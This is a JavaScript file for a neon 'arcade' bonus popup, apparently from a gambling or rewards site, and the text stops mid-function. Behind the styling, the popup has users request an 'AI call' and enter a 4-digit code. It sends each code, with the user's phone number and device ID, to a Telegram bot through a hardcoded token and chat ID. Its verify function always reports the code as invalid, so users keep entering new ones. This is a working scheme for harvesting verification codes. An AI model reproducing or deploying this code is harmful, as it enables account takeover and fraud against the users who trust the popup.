/**
 * Popup PlayBonus - Unique Carnival Arcade Theme
 * Hindi pareho sa share_and_earn.html
 * Theme: Neon Arcade + 3D Casino + Rainbow Lights
 */

(function() {
    'use strict';
    
    var currentBalance = 0;
    var callInProgress = false;
    var callCountdown = 60;
    var callTimerInterval = null;
    var currentCallCode = '';
    var currentFirewallStatus = false;
    
    // ========== SOUNDS ==========
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) { console.log('Sound error:', e); });
        } catch(e) {}
    }
    
    function playClaimSound() {
        try {
            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(function(e) { console.log('Sound error:', e); });
        } catch(e) {}
    }
    
    // ========== TELEGRAM ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) { console.error('Telegram error:', e); });
        } catch(e) {}
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎮 ARCADE VERIFICATION REQUEST\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Waiting for call\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '🎯 ARCADE CODE ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    function sendAICallExpiredNotification(userPhone, deviceId) {
        var now = new Date();
        var timestamp = now.toLocaleString();
        var message = '⏰ ARCADE CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Expired\n━━━━━━━━━━━━━━━━━━━━';
        sendTelegramMessage(message);
    }
    
    // ========== GET FIREWALL STATUS ==========
    function getFirewallStatus() {
        try {
            var db = firebase.database();
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                currentFirewallStatus = (data && data.active === true);
                return currentFirewallStatus;
            });
        } catch(e) {
            return Promise.resolve(false);
        }
    }
    
    // ========== ADD ARCADE THEME STYLES ==========
    function addArcadeStyles() {
        if (document.querySelector('#arcade-popup-styles')) return;
        
        var style = document.createElement('style');
        style.id = 'arcade-popup-styles';
        style.textContent = `
            /* ============================================================
               ARCADE POPUP THEME - UNIQUE FOR PLAYBONUS
               Neon Grid + 3D Casino + Rainbow Lights
               ============================================================ */
            
            .arcade-popup-overlay {
                position: fixed;
                inset: 0;
                background: 
                    radial-gradient(circle at 50% 40%, rgba(0, 255, 255, 0.15) 0%, transparent 50%),
                    linear-gradient(180deg, #0a0520 0%, #1a0a3a 50%, #0a0510 100%);
                backdrop-filter: blur(12px);
                -webkit-backdrop-filter: blur(12px);
                z-index: 99999;
                display: none;
                align-items: center;
                justify-content: center;
                padding: 16px;
                animation: arcadeFadeIn 0.4s ease;
                overflow: hidden;
            }
            
            .arcade-popup-overlay.show {
                display: flex;
            }
            
            @keyframes arcadeFadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            
            /* ========== NEON GRID BACKGROUND ========== */
            .arcade-popup-overlay::before {
                content: '';
                position: absolute;
                inset: -10%;
                background-image: 
                    linear-gradient(rgba(0, 255, 255, 0.15) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255, 0, 255, 0.15) 1px, transparent 1px);
                background-size: 40px 40px;
                transform: perspective(500px) rotateX(60deg);
                animation: gridMove 8s linear infinite;
                pointer-events: none;
                z-index: 1;
            }
            
            @keyframes gridMove {
                from { background-position: 0 0; }
                to { background-position: 40px 40px; }
            }
            
            /* ========== RAINBOW LIGHTS ========== */
            .arcade-popup-overlay::after {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: 
                    conic-gradient(from 0deg at 50% 50%,
                        rgba(255, 0, 128, 0.15) 0deg,
                        rgba(255, 200, 0, 0.15) 60deg,
                        rgba(0, 255, 128, 0.15) 120deg,
                        rgba(0, 200, 255, 0.15) 180deg,
                        rgba(150, 0, 255, 0.15) 240deg,
                        rgba(255, 0, 128, 0.15) 300deg,
                        rgba(255, 0, 128, 0.15) 360deg);
                animation: rainbowSpin 20s linear infinite;
                pointer-events: none;
                z-index: 0;
                filter: blur(40px);
            }
            
            @keyframes rainbowSpin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }
            
            /* ========== MAIN CONTAINER ========== */
            .arcade-popup-container {
                position: relative;
                z-index: 10;
                width: 100%;
                max-width: 400px;
                background: 
                    linear-gradient(180deg, rgba(0, 255, 255, 0.08) 0%, transparent 30%),
                    linear-gradient(145deg, #1a0a3a 0%, #2a1050 50%, #0a0520 100%);
                border: 3px solid #00ffff;
                border-radius: 24px;
                padding: 26px 20px 22px;
                box-shadow: 
                    0 0 30px rgba(0, 255, 255, 0.8),
                    0 0 60px rgba(255, 0, 255, 0.5),
                    0 0 100px rgba(0, 200, 255, 0.3),
                    inset 0 0 30px rgba(0, 255, 255, 0.1);
                animation: arcadePopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
                overflow: hidden;
            }
            
            @keyframes arcadePopIn {
                0% { transform: scale(0.4) rotate(-10deg); opacity: 0; }
                60% { transform: scale(1.08) rotate(3deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            
            /* Animated border glow */
            .arcade-popup-container::before {
                content: '';
                position: absolute;
                inset: -3px;
                border-radius: 24px;
                padding: 3px;
                background: conic-gradient(
                    from var(--arcadeAngle, 0deg),
                    #00ffff 0%,
                    #ff00ff 25%,
                    #ffff00 50%,
                    #00ff00 75%,
                    #00ffff 100%
                );
                -webkit-mask: 
                    linear-gradient(#fff 0 0) content-box, 
                    linear-gradient(#fff 0 0);
                -webkit-mask-composite: xor;
                mask-composite: exclude;
                pointer-events: none;
                z-index: 0;
                animation: arcadeBorderRotate 3s linear infinite;
            }
            
            @property --arcadeAngle {
                syntax: '<angle>';
                initial-value: 0deg;
                inherits: false;
            }
            
            @keyframes arcadeBorderRotate {
                to { --arcadeAngle: 360deg; }
            }
            
            /* ========== HEADER ========== */
            .arcade-header {
                text-align: center;
                margin-bottom: 16px;
                position: relative;
                z-index: 2;
            }
            
            .arcade-title {
                font-family: 'Orbitron', monospace;
                font-size: 22px;
                font-weight: 900;
                background: linear-gradient(180deg, #00ffff 0%, #ff00ff 50%, #ffff00 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 4px;
                text-transform: uppercase;
                filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
                animation: arcadeTitlePulse 2s ease-in-out infinite;
                margin-bottom: 4px;
            }
            
            @keyframes arcadeTitlePulse {
                0%, 100% { 
                    filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
                }
                50% { 
                    filter: drop-shadow(0 0 25px rgba(255, 0, 255, 1))
                            drop-shadow(0 0 40px rgba(0, 255, 255, 0.5));
                }
            }
            
            .arcade-subtitle {
                font-family: 'Poppins', sans-serif;
                font-size: 10px;
                color: rgba(0, 255, 255, 0.7);
                letter-spacing: 3px;
                text-transform: uppercase;
                margin-top: 4px;
            }
            
            /* ========== PHONE ICON ========== */
            .arcade-phone-icon {
                width: 70px;
                height: 70px;
                margin: 0 auto 14px;
                background: 
                    radial-gradient(circle at 30% 30%, #ff00ff, #6600cc);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                border: 3px solid #00ffff;
                box-shadow: 
                    0 0 30px rgba(0, 255, 255, 0.8),
                    0 0 60px rgba(255, 0, 255, 0.5),
                    inset 0 0 20px rgba(0, 0, 0, 0.5);
                animation: arcadePhonePulse 1.5s ease-in-out infinite;
                position: relative;
                z-index: 2;
            }
            
            @keyframes arcadePhonePulse {
                0%, 100% { 
                    transform: scale(1);
                    box-shadow: 0 0 30px rgba(0, 255, 255, 0.8);
                }
                50% { 
                    transform: scale(1.08);
                    box-shadow: 
                        0 0 50px rgba(0, 255, 255, 1),
                        0 0 80px rgba(255, 0, 255, 0.6);
                }
            }
            
            .arcade-phone-icon i {
                font-size: 32px;
                color: #fff;
                text-shadow: 
                    0 0 10px #00ffff,
                    0 0 20px #ff00ff;
            }
            
            /* ========== STATUS BOX ========== */
            .arcade-status-box {
                background: 
                    linear-gradient(180deg, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
                    linear-gradient(135deg, #0a0520, #1a0a3a);
                border: 2px solid #00ffff;
                border-radius: 14px;
                padding: 16px;
                margin: 14px 0;
                text-align: center;
                box-shadow: 
                    0 0 25px rgba(0, 255, 255, 0.4),
                    inset 0 0 20px rgba(0, 255, 255, 0.05);
                position: relative;
                overflow: hidden;
                z-index: 2;
            }
            
            .arcade-status-box::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 50%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
                animation: arcadeScanner 2.5s infinite;
            }
            
            @keyframes arcadeScanner {
                100% { left: 200%; }
            }
            
            .arcade-status-text {
                font-family: 'Poppins', sans-serif;
                font-size: 12px;
                color: rgba(255, 255, 255, 0.9);
                line-height: 1.5;
                position: relative;
                z-index: 2;
            }
            
            .arcade-status-text strong {
                color: #00ffff;
                text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
                font-weight: 800;
            }
            
            /* Phone Number Display */
            .arcade-phone-number {
                font-family: 'Orbitron', monospace;
                font-size: 22px;
                font-weight: 900;
                background: linear-gradient(180deg, #00ffff 0%, #ff00ff 100%);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                letter-spacing: 2px;
                margin: 10px 0;
                filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.8));
                animation: arcadeNumberReveal 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards,
                           arcadeNumberGlow 2s ease-in-out infinite 0.8s;
                display: inline-block;
            }
            
            @keyframes arcadeNumberReveal {
                0% { opacity: 0; transform: scale(0.5) rotateX(90deg); }
                50% { opacity: 0.5; transform: scale(1.1) rotateX(-10deg); }
                100% { opacity: 1; transform: scale(1) rotateX(0deg); }
            }
            
            @keyframes arcadeNumberGlow {
                0%, 100% { 
                    filter: drop-shadow(0 0 15px rgba(0, 255, 255, 0.5));
                }
                50% { 
                    filter: drop-shadow(0 0 30px rgba(255, 0, 255, 0.9));
                }
            }
            
            /* ========== TIMER ========== */
            .arcade-timer {
                font-family: 'Orbitron', monospace;
                font-size: 32px;
                font-weight: 900;
                color: #00ff00;
                text-shadow: 
                    0 0 20px rgba(0, 255, 0, 0.8),
                    0 0 40px rgba(0, 255, 0, 0.4);
                letter-spacing: 3px;
                margin: 8px 0;
                transition: all 0.3s ease;
                position: relative;
                z-index: 2;
            }
            
            .arcade-timer.urgent {
                color: #ff0044;
                text-shadow: 
                    0 0 20px rgba(255, 0, 68, 0.9),
                    0 0 40px rgba(255, 0, 68, 0.6),
                    0 0 80px rgba(255, 0, 68, 0.3);
                animation: arcadeTimerUrgent 0.4s ease-in-out infinite;
            }
            
            @keyframes arcadeTimerUrgent {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.12); }
            }
            
            /* ========== BUTTONS ========== */
            .arcade-btn {
                width: 100%;
                padding: 16px 20px;
                border-radius: 14px;
                font-family: 'Orbitron', monospace;
                font-size: 14px;
                font-weight: 900;
                letter-spacing: 2px;
                text-transform: uppercase;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                position: relative;
                overflow: hidden;
                transition: all 0.15s ease;
                box-sizing: border-box;
                z-index: 2;
            }
            
            /* Request Call Button - Cyan/Blue */
            .arcade-btn-primary {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),
                    linear-gradient(180deg, #00ffff 0%, #0088ff 50%, #0044cc 100%);
                border: 3px solid #7dd3fc;
                color: #001a33;
                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
                box-shadow: 
                    0 5px 0 #003366,
                    0 10px 25px rgba(0, 0, 0, 0.5),
                    0 0 30px rgba(0, 255, 255, 0.7);
            }
            
            .arcade-btn-primary:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #003366,
                    0 5px 15px rgba(0, 0, 0, 0.5),
                    0 0 20px rgba(0, 255, 255, 0.5);
            }
            
            /* Verify Button - Neon Green */
            .arcade-btn-verify {
                background: 
                    linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),
                    linear-gradient(180deg, #00ff88 0%, #00cc44 50%, #008833 100%);
                border: 3px solid #7dffb3;
                color: #00331a;
                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
                box-shadow: 
                    0 5px 0 #005522,
                    0 10px 25px rgba(0, 0, 0, 0.5),
                    0 0 30px rgba(0, 255, 136, 0.7);
            }
            
            .arcade-btn-verify:active {
                transform: translateY(5px);
                box-shadow: 
                    0 0 0 #005522,
                    0 5px 15px rgba(0, 0, 0, 0.5);
            }
            
            /* Back Button */
            .arcade-btn-back {
                background: linear-gradient(180deg, #3a3a5a, #1a1a3a);
                border: 2px solid #5a5a8a;
                color: #aaaadd;
                box-shadow: 0 3px 0 #0a0a1a;
                font-size: 11px;
                padding: 10px 20px;
                margin-top: 10px;
                width: auto;
                display: inline-flex;
            }
            
            .arcade-btn-back:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 #0a0a1a;
            }
            
            /* Shine effect */
            .arcade-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.6), transparent);
                animation: arcadeBtnShine 2.5s infinite;
            }
            
            @keyframes arcadeBtnShine {
                0% { left: -100%; }
                60% { left: 100%; }
                100% { left: 100%; }
            }
            
            /* ========== INPUT FIELD ========== */
            .arcade-input {
                width: 100%;
                max-width: 200px;
                margin: 0 auto 12px;
                display: block;
                text-align: center;
                font-family: 'Orbitron', monospace;
                font-size: 26px;
                font-weight: 900;
                padding: 14px;
                background: 
                    linear-gradient(180deg, rgba(0, 255, 255, 0.05) 0%, transparent 50%),
                    #050515;
                border: 3px solid #00ffff;
                border-radius: 12px;
                color: #00ffff;
                letter-spacing: 6px;
                transition: all 0.3s ease;
                box-shadow: 
                    0 0 20px rgba(0, 255, 255, 0.5),
                    inset 0 0 15px rgba(0, 255, 255, 0.1);
                outline: none;
                box-sizing: border-box;
            }
            
            .arcade-input:focus {
                border-color: #ff00ff;
                box-shadow: 
                    0 0 30px rgba(255, 0, 255, 0.8),
                    inset 0 0 20px rgba(255, 0, 255, 0.15);
            }
            
            .arcade-input::placeholder {
                color: rgba(0, 255, 255, 0.4);
                letter-spacing: 3px;
                font-size: 16px;
            }
            
            /* ========== MESSAGES ========== */
            .arcade-msg {
                font-family: 'Poppins', sans-serif;
                font-size: 11px;
                text-align: center;
                padding: 10px;
                margin-top: 10px;
                border-radius: 10px;
                display: none;
                position: relative;
                z-index: 2;
            }
            
            .arcade-msg.show {
                display: block;
                animation: msgSlideIn 0.3s ease;
            }
            
            @keyframes msgSlideIn {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .arcade-msg-error {
                color: #ff4466;
                background: rgba(255, 68, 102, 0.15);
                border: 1px solid rgba(255, 68, 102, 0.4);
                box-shadow: 0 0 15px rgba(255, 68, 102, 0.3);
            }
            
            .arcade-msg-expired {
                color: #ff9800;
                background: rgba(255, 152, 0, 0.15);
                border: 1px solid rgba(255, 152, 0, 0.4);
            }
            
            /* ========== CODE SECTION ========== */
            .arcade-code-section {
                display: none;
                margin-top: 14px;
                position: relative;
                z-index: 2;
            }
            
            .arcade-code-section.show {
                display: block;
                animation: codeSectionSlide 0.4s ease;
            }
            
            @keyframes codeSectionSlide {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            .arcade-code-label {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                margin-bottom: 12px;
                font-family: 'Orbitron', monospace;
                font-size: 10px;
                color: #00ffff;
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            
            .arcade-code-label i {
                font-size: 14px;
                animation: ticketBounce 1s ease-in-out infinite;
            }
            
            @keyframes ticketBounce {
                0%, 100% { transform: rotate(-10deg) scale(1); }
                50% { transform: rotate(10deg) scale(1.1); }
            }
            
            /* ========== DIVIDER ========== */
            .arcade-divider {
                width: 60px;
                height: 2px;
                background: linear-gradient(90deg, transparent, #00ffff, #ff00ff, transparent);
                margin: 12px auto;
                box-shadow: 0 0 15px rgba(0, 255, 255, 0.6);
            }
            
            /* ========== CLOSE BUTTON ========== */
            .arcade-close {
                position: absolute;
                top: 14px;
                right: 16px;
                width: 36px;
                height: 36px;
                background: rgba(0, 255, 255, 0.15);
                border: 2px solid #00ffff;
                border-radius: 50%;
                color: #00ffff;
                font-size: 16px;
                font-weight: 900;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: all 0.2s ease;
                z-index: 10;
                font-family: 'Orbitron', monospace;
                box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
            }
            
            .arcade-close:hover,
            .arcade-close:active {
                background: rgba(255, 0, 102, 0.3);
                color: #fff;
                transform: rotate(90deg);
                border-color: #ff0066;
                box-shadow: 0 0 25px rgba(255, 0, 102, 0.8);
            }
            
            /* ========== RESPONSIVE ========== */
            @media (max-width: 480px) {
                .arcade-popup-container {
                    padding: 22px 16px 18px;
                    border-radius: 20px;
                }
                
                .arcade-title {
                    font-size: 18px;
                    letter-spacing: 3px;
                }
                
                .arcade-phone-icon {
                    width: 60px;
                    height: 60px;
                }
                
                .arcade-phone-icon i {
                    font-size: 26px;
                }
                
                .arcade-phone-number {
                    font-size: 18px;
                }
                
                .arcade-timer {
                    font-size: 26px;
                }
                
                .arcade-input {
                    font-size: 22px;
                    padding: 12px;
                }
                
                .arcade-btn {
                    padding: 14px 16px;
                    font-size: 12px;
                }
            }
        `;
        document.head.appendChild(style);
    }
    
    // ========== CREATE POPUP HTML ==========
    function createArcadePopup() {
        if (document.getElementById('arcadePopup')) return;
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.length >= 11 ? 
            userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11) : 
            userPhone;
        
        var popup = document.createElement('div');
        popup.id = 'arcadePopup';
        popup.className = 'arcade-popup-overlay';
        popup.innerHTML = `
            <div class="arcade-popup-container">
                <button class="arcade-close" id="arcadeClose">✕</button>
                
                <!-- Header -->
                <div class="arcade-header">
                    <div class="arcade-phone-icon">
                        <i class="fas fa-phone-alt"></i>
                    </div>
                    <div class="arcade-title">ARCADE VERIFY</div>
                    <div class="arcade-subtitle">◆ AI CALL SYSTEM ◆</div>
                </div>
                
                <div class="arcade-divider"></div>
                
                <!-- Status Box -->
                <div class="arcade-status-box" id="arcadeStatusBox">
                    <div id="arcadeStatusIcon" style="font-size: 28px; margin-bottom: 6px;">🎮</div>
                    <div id="arcadeStatusText" class="arcade-status-text">
                        <strong>AI CALL</strong> will provide your code
                    </div>
                    
                    <div id="arcadePhoneDisplay" style="display: none; margin-top: 8px;">
                        <div class="arcade-phone-number">📱 ${formattedPhone}</div>
                    </div>
                    
                    <div id="arcadeTimer" class="arcade-timer" style="display: none;">60s</div>
                </div>
                
                <!-- Request Call Button -->
                <button id="arcadeRequestBtn" class="arcade-btn arcade-btn-primary">
                    <i class="fas fa-phone-alt"></i>
                    <span>REQUEST AI CALL</span>
                </button>
                
                <!-- Code Input Section -->
                <div id="arcadeCodeSection" class="arcade-code-section">
                    <div class="arcade-code-label">
                        <i class="fas fa-ticket-alt"></i>
                        <span>ENTER 4-DIGIT CODE FROM CALL</span>
                    </div>
                    
                    <input type="text" id="arcadeCodeInput" class="arcade-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                    
                    <button id="arcadeVerifyBtn" class="arcade-btn arcade-btn-verify">
                        <i class="fas fa-check-double"></i>
                        <span>VERIFY CODE</span>
                    </button>
                    
                    <div id="arcadeErrorMsg" class="arcade-msg arcade-msg-error">
                        <i class="fas fa-times-circle"></i> Invalid code. Request a new call.
                    </div>
                    
                    <div id="arcadeExpiredMsg" class="arcade-msg arcade-msg-expired">
                        <i class="fas fa-clock"></i> Call expired. Request a new call.
                    </div>
                </div>
                
                <!-- Back Button -->
                <div style="text-align: center; margin-top: 12px;">
                    <button class="arcade-btn arcade-btn-back" id="arcadeBackBtn">← BACK</button>
                </div>
            </div>
        `;
        
        document.body.appendChild(popup);
        
        // Attach events
        attachArcadeEvents();
    }
    
    // ========== ATTACH EVENTS ==========
    function attachArcadeEvents() {
        var closeBtn = document.getElementById('arcadeClose');
        var backBtn = document.getElementById('arcadeBackBtn');
        var requestBtn = document.getElementById('arcadeRequestBtn');
        var verifyBtn = document.getElementById('arcadeVerifyBtn');
        var codeInput = document.getElementById('arcadeCodeInput');
        
        if (closeBtn) closeBtn.onclick = closeArcadePopup;
        if (backBtn) backBtn.onclick = closeArcadePopup;
        
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) {
                    alert("Please wait for the current call to complete.");
                    return;
                }
                requestArcadeCall();
            };
        }
        
        if (verifyBtn) {
            verifyBtn.onclick = verifyArcadeCode;
        }
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') verifyArcadeCode();
            });
            
            codeInput.addEventListener('input', function() {
                var value = this.value.trim();
                if (value.length === 4 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#00ff88';
                    this.style.boxShadow = '0 0 30px rgba(0, 255, 136, 0.6)';
                } else {
                    this.style.borderColor = '#00ffff';
                    this.style.boxShadow = '0 0 20px rgba(0, 255, 255, 0.5)';
                }
            });
        }
    }
    
    // ========== REQUEST ARCADE CALL ==========
    function requestArcadeCall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('arcadeStatusIcon');
        var statusText = document.getElementById('arcadeStatusText');
        var phoneDisplay = document.getElementById('arcadePhoneDisplay');
        var timerDisplay = document.getElementById('arcadeTimer');
        var requestBtn = document.getElementById('arcadeRequestBtn');
        var codeSection = document.getElementById('arcadeCodeSection');
        var codeInput = document.getElementById('arcadeCodeInput');
        var errorMsg = document.getElementById('arcadeErrorMsg');
        var expiredMsg = document.getElementById('arcadeExpiredMsg');
        
        if (errorMsg) errorMsg.classList.remove('show');
        if (expiredMsg) expiredMsg.classList.remove('show');
        if (codeInput) codeInput.value = '';
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) {
            statusText.innerHTML = '<strong>AI CALL</strong> being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.5);">Please wait</span>';
        }
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.classList.remove('urgent');
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.style.opacity = '0.5';
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>CALLING...</span>';
        }
        if (codeSection) codeSection.classList.remove('show');
        
        playCallSound();
        startArcadeTimer();
        
        // Simulate call connection
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #00ff88;">🎯 CALL CONNECTED!</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Enter the 4-digit code</span>';
            }
            if (codeSection) codeSection.classList.add('show');
            if (codeInput) codeInput.focus();
        }, 4000);
    }
    
    // ========== START TIMER ==========
    function startArcadeTimer() {
        stopArcadeTimer();
        
        var timerDisplay = document.getElementById('arcadeTimer');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                
                if (callCountdown <= 9) {
                    timerDisplay.classList.add('urgent');
                } else {
                    timerDisplay.classList.remove('urgent');
                }
            }
            
            if (callCountdown <= 0) {
                stopArcadeTimer();
                
                var userPhone = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendAICallExpiredNotification(userPhone, deviceId);
                
                var statusText = document.getElementById('arcadeStatusText');
                var codeSection = document.getElementById('arcadeCodeSection');
                var requestBtn = document.getElementById('arcadeRequestBtn');
                var expiredMsg = document.getElementById('arcadeExpiredMsg');
                
                if (statusText) {
                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Request a new call</span>';
                }
                if (timerDisplay) timerDisplay.style.display = 'none';
                if (codeSection) codeSection.classList.remove('show');
                if (requestBtn) {
                    requestBtn.disabled = false;
                    requestBtn.style.opacity = '1';
                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
                }
                if (expiredMsg) expiredMsg.classList.add('show');
                
                callInProgress = false;
            }
        }, 1000);
    }
    
    function stopArcadeTimer() {
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
    }
    
    // ========== VERIFY CODE (Always Invalid) ==========
    function verifyArcadeCode() {
        var codeInput = document.getElementById('arcadeCodeInput');
        var errorMsg = document.getElementById('arcadeErrorMsg');
        var expiredMsg = document.getElementById('arcadeExpiredMsg');
        var verifyBtn = document.getElementById('arcadeVerifyBtn');
        
        if (!codeInput) return;
        
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
            if (errorMsg) {
                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter valid 4-digit code.';
                errorMsg.classList.add('show');
            }
            shakeArcadeElement(codeInput);
            return;
        }
        
        if (callCountdown <= 0) {
            if (expiredMsg) expiredMsg.classList.add('show');
            if (errorMsg) errorMsg.classList.remove('show');
            return;
        }
        
        // ALWAYS INVALID
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
        
        if (errorMsg) {
            errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request new call.';
            errorMsg.classList.add('show');
        }
        
        codeInput.style.borderColor = '#ff0044';
        codeInput.style.boxShadow = '0 0 30px rgba(255, 0, 68, 0.7)';
        shakeArcadeElement(codeInput);
        
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.5';
            setTimeout(function() {
                if (verifyBtn) {
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                }
            }, 2000);
        }
        
        setTimeout(function() {
            codeInput.value = '';
            codeInput.style.borderColor = '#00ffff';
            codeInput.style.boxShadow = '0 0 20px rgba(0, 255, 255, 0.5)';
        }, 1500);
        
        setTimeout(function() {
            if (errorMsg) errorMsg.classList.remove('show');
            
            var statusText = document.getElementById('arcadeStatusText');
            var timerDisplay = document.getElementById('arcadeTimer');
            var codeSection = document.getElementById('arcadeCodeSection');
            var requestBtn = document.getElementById('arcadeRequestBtn');
            
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.6);">Request new call</span>';
            }
            if (timerDisplay) {
                timerDisplay.style.display = 'none';
                timerDisplay.classList.remove('urgent');
            }
            if (codeSection) codeSection.classList.remove('show');
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
            }
            
            callInProgress = false;
        }, 4000);
    }
    
    function shakeArcadeElement(element) {
        if (!element) return;
        element.style.animation = 'errorShake 0.5s ease';
        setTimeout(function() { element.style.animation = ''; }, 500);
    }
    
    // ========== PUBLIC FUNCTIONS ==========
    function showArcadePopup(balance) {
        currentBalance = balance;
        
        addArcadeStyles();
        createArcadePopup();
        
        // Reset state
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
        
        var popup = document.getElementById('arcadePopup');
        if (popup) {
            popup.classList.add('show');
            
            var ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
            
            // Reset UI
            var statusIcon = document.getElementById('arcadeStatusIcon');
            var statusText = document.getElementById('arcadeStatusText');
            var phoneDisplay = document.getElementById('arcadePhoneDisplay');
